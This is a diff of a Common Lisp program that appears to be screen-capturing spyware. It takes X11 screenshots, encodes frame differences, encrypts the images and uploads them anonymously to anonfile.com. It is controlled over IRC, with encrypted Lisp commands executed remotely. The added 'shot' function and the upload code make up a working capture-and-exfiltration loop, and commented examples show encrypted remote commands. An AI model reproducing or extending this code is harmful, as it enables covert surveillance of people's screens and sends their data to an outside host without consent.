@@ -12,25 +12,6 @@
 (ql:quickload "cl-json")
 
 ;; may be not needed
-(defun get-png-obj (width height image &optional (color-type :truecolor-alpha))
-  (let* ((png (make-instance 'zpng:png :width width :height height
-                             :color-type color-type))
-         (vector (make-array ;; displaced vector - need copy for save
-                  (* height width (zpng:samples-per-pixel png))
-                  :displaced-to image :element-type '(unsigned-byte 8))))
-    ;; Тут применен потенциально опасный трюк, когда мы создаем
-    ;; объект PNG без данных, а потом добавляем в него данные,
-    ;; используя неэкспортируемый writer.
-    ;; Это нужно чтобы получить третью размерность массива,
-    ;; который мы хотим передать как данные и при этом
-    ;; избежать создания для этого временного объекта
-    (setf (zpng::%image-data png) (copy-seq vector))
-    png))
-
-(defun get-png-sequence (png)
-  (flex:with-output-to-sequence (stream)
-    (zpng:write-png-stream png stream)))
-
 ;; DEPRECATED, use explicit saving png-sequence by with-open-file
 ;; (defun save-png (pathname-str png)
 ;;   (zpng:write-png png pathname-str))
@@ -226,19 +207,6 @@
 
 ;; (encrypt
 ;;  (flex:string-to-octets
-;;   "(defun snd () (bt:with-lock-held (*irc-lock*) (cl-irc:privmsg *irc-conn* *irc-chan* (format nil \"nfo:error\"))))"
-;;   :external-format :utf-8)
-;;  3783992823)
-
-;; (encrypt
-;;  (flex:string-to-octets
-;;   ;; "(unschedule-timer *shot-timer*)"
-;;   "(schedule-timer *shot-timer* 1 :repeat-interval 1)"
-;;   :external-format :utf-8)
-;;  3783995947)
-
-;; (encrypt
-;;  (flex:string-to-octets
 ;;   "(progn (quit))"
 ;;   :external-format :utf-8)
 ;;  3783992823)
@@ -300,6 +268,7 @@
     (dbg "::irc conn:~A~%" *irc-conn*)
     (setf *watchdog-timer* 0)
     (irc-loop)))
+;; x_snapshot
 (defmacro with-display (host (display screen root-window) &body body)
   `(let* ((,display (xlib:open-display ,host))
           (,screen (first (xlib:display-roots ,display)))
@@ -392,7 +361,9 @@
           (zpng:data-array image)))))
 
 ;; (x-snapshot :path "x-snapshot-true-color.png")
-(defun pack-image (image)
+
+;; pack_image
+(defun pack-img (image)
   (declare (optimize (speed 3) (safety 0)))
   (let* ((dims (array-dimensions image))
          (height (car dims))
@@ -436,64 +407,41 @@
         ))
     result))
 
-;; (disassemble 'pack-image)
+;; (disassemble 'pack-img)
 
-;; TEST: pack-image
+;; TEST: pack-img
 ;; (time
-;;  (let* ((image (pack-image (x-snapshot)))
+;;  (let* ((image (pack-img (x-snapshot)))
 ;;         (dims (array-dimensions image)))
 ;;    (save-png (cadr dims)
 ;;              (car dims)
 ;;              (format nil "~A" (gensym "FILE"))
 ;;              image
 ;;              :grayscale)))
-(defun unpack-image (image)
-  (declare (optimize (speed 3) (safety 0)))
-  (let* ((dims (array-dimensions image))
-         (height (car dims))
-         (width (cadr dims))
-         (new-width (ash width 3))
-         (result (make-array (list height new-width)
-                             :element-type '(unsigned-byte 8))))
-    (declare (type fixnum width)
-             (type fixnum new-width)
-             (type fixnum height))
-    (do ((qy 0 (incf qy)))
-        ((= qy height))
-      (declare (type fixnum qy))
-      (do ((qx 0 (incf qx)))
-          ((= qx width))
-        (declare (type fixnum qx))
-        (let ((acc (aref image qy qx)))
-          (declare (type (unsigned-byte 8) acc))
-          ;; (format t "~8,'0B" acc)
-          (do ((out 0 (incf out))
-               (in  7 (decf in)))
-              ((= 8 out))
-            (declare (type fixnum out in))
-            (unless (= 0 (logand acc (ash 1 in)))
-              (setf (aref result qy (logior (ash qx 3) out))
-                    255)))))
-      ;; (format t "~%")
-      )
-    result))
 
-;; TEST
-;; (print
-;;  (unpack-image
-;;   (pack-image
-;;    (x-snapshot :width 31 :height 23))))
+;; wrap_img
+;; get_png_obj
+(defun get-png-obj (width height image &optional (color-type :truecolor-alpha))
+  (let* ((png (make-instance 'zpng:png :width width :height height
+                             :color-type color-type))
+         (vector (make-array ;; displaced vector - need copy for save
+                  (* height width (zpng:samples-per-pixel png))
+                  :displaced-to image :element-type '(unsigned-byte 8))))
+    ;; Тут применен потенциально опасный трюк, когда мы создаем
+    ;; объект PNG без данных, а потом добавляем в него данные,
+    ;; используя неэкспортируемый writer.
+    ;; Это нужно чтобы получить третью размерность массива,
+    ;; который мы хотим передать как данные и при этом
+    ;; избежать создания для этого временного объекта
+    (setf (zpng::%image-data png) (copy-seq vector))
+    png))
 
-;; TEST
-;; (time
-;;  (let* ((image  (load-png "FILE1088"))
-;;         (unpack (unpack-image image))
-;;         (dims (array-dimensions unpack)))
-;;    (save-png (cadr dims)
-;;              (car dims)
-;;              (format nil "~A" (gensym "FILE"))
-;;              unpack
-;;              :grayscale)))
+;; get_png_seq
+(defun get-png-seq (png)
+  (flex:with-output-to-sequence (stream)
+    (zpng:write-png-stream png stream)))
+
+;; upload
 ;; (setf drakma:*header-stream* *standard-output*)
 
 (defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")
@@ -517,8 +465,9 @@
 (defun anon-file-upload (filename content)
   (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
     ;; load mainpage for cookies, headers and csrf
-    (multiple-value-bind (body-or-stream status-code headers
-                                         uri stream must-close reason-phrase)
+    (multiple-value-bind (body-or-stream ;; status-code headers uri
+                          ;;stream must-close reason-phrase
+                          )
         (drakma:http-request "https://anonfile.com/"
                              :user-agent *user-agent*
                              :redirect 10
@@ -538,8 +487,9 @@
                             ("Referer" . "https://anonfile.com/")
                             ("Content-Type" . ,type-header)
                             ("TE" . "Trailers"))))
-        (multiple-value-bind (body-or-stream status-code headers
-                                             uri stream must-close reason-phrase)
+        (multiple-value-bind (body-or-stream ;; status-code headers uri
+                              ;;stream must-close reason-phrase
+                              )
             (drakma:http-request
              "https://api.anonfile.com/upload"
              ;; "http://localhost:9993/upload"
@@ -592,71 +542,14 @@ Content-Type: application/octet-stream
 ;;     (format nil "~A"
 ;;             (bprint file-info))))
 
-(defun shot ()
-  ;; (dbg "~A~%" *shot-threads*)
-  (sendmsg "shot started")
-  (sleep 100))
-
-;; (defparameter *shot-timer*
-;;   (make-timer #'(lambda ()
-;;                   (shot))
-;;               :name "shot" :thread t))
-
-;; (defparameter *stop* nil)
-
-;; (let ((prev)
-;;       (cnt 9999))
-;;   (defun shot ()
-;;     (let* ((snap (pack-image (x-snapshot)))
-;;            (dims (array-dimensions snap)))
-;;       (if (> cnt 4)
-;;           (progn
-;;             (save "~A" dims snap)
-;;             (setf prev snap)
-;;             (setf cnt 0))
-;;           ;; else
-;;           (let ((xored (make-array dims :element-type '(unsigned-byte 8))))
-;;             (do ((qy 0 (incf qy)))
-;;                 ((= qy (car dims)))
-;;               (declare (type fixnum qy))
-;;               (do ((qx 0 (incf qx)))
-;;                   ((= qx (cadr dims)))
-;;                 (declare (type fixnum qx))
-;;                 (setf (aref xored qy qx)
-;;                       (logxor (aref prev qy qx)
-;;                               (aref snap qy qx)))))
-;;             (save (format nil "~~A_~A" cnt) dims xored)
-;;             (setf prev snap)
-;;             (incf cnt))))))
-
-;; (schedule-timer *shot-timer* 1 :repeat-interval 1)
-
-
-
-(defun save-png (width height pathname-str image
-                 &optional (color-type :truecolor-alpha))
-  (let* ((png (make-instance 'zpng:png :width width :height height
-                             :color-type color-type))
-         (vector (make-array ;; displaced vector - need copy for save
-                  (* height width (zpng:samples-per-pixel png))
-                  :displaced-to image :element-type '(unsigned-byte 8))))
-    ;; Тут применен потенциально опасный трюк, когда мы создаем
-    ;; объект PNG без данных, а потом добавляем в него данные,
-    ;; используя неэкспортируемый writer.
-    ;; Это нужно чтобы получить третью размерность массива,
-    ;; который мы хотим передать как данные и при этом
-    ;; избежать создания для этого временного объекта
-    (setf (zpng::%image-data png) (copy-seq vector))
-    (zpng:write-png png pathname-str)))
-
-(defun save (frmt-filename-str dims image)
+;; wrap-img
+(defun wrap-img (frmt-filename-str dims image)
   (block save-block
     (let* ((height     (car  dims))
            (width      (cadr dims))
            (png        (get-png-obj width height image :grayscale))
-           (png-seq    (get-png-sequence png))
+           (png-seq    (get-png-seq png))
            (base64     (encrypt png-seq *irc-sess*))
-           (decoded    (decrypt base64 *irc-sess*))
            (filename   (format nil frmt-filename-str
                                (format nil "~A" (get-universal-time))))
            (upload-ret (handler-case
@@ -682,3 +575,37 @@ Content-Type: application/octet-stream
       ;;                              :element-type '(unsigned-byte 8))
       ;;   (write-sequence decoded file-stream))
       )))
+
+;; get_img_diff
+(declaim (inline get-img-diff))
+
+(defun get-img-diff (dims prev snap)
+  (let ((diff (make-array dims :element-type '(unsigned-byte 8))))
+    (do ((qy 0 (incf qy)))
+        ((= qy (car dims)))
+      (declare (type fixnum qy))
+      (do ((qx 0 (incf qx)))
+          ((= qx (cadr dims)))
+        (declare (type fixnum qx))
+        (setf (aref diff qy qx)
+              (logxor (aref prev qy qx)
+                      (aref snap qy qx)))))
+    diff))
+
+;; shot
+(let ((prev)
+      (cnt 9999))
+  (defun shot ()
+    (declare (inline get-img-diff))
+    (let* ((snap (pack-img (x-snapshot)))
+           (dims (array-dimensions snap)))
+      (if (> cnt 4)
+          (progn
+            (wrap-img "~A" dims snap)
+            (setf prev snap)
+            (setf cnt 0))
+          ;; else
+          (let ((diff (get-img-diff dims prev snap)))
+            (wrap-img (format nil "~~A_~A" cnt) dims diff)
+            (setf prev snap)
+            (incf cnt))))))
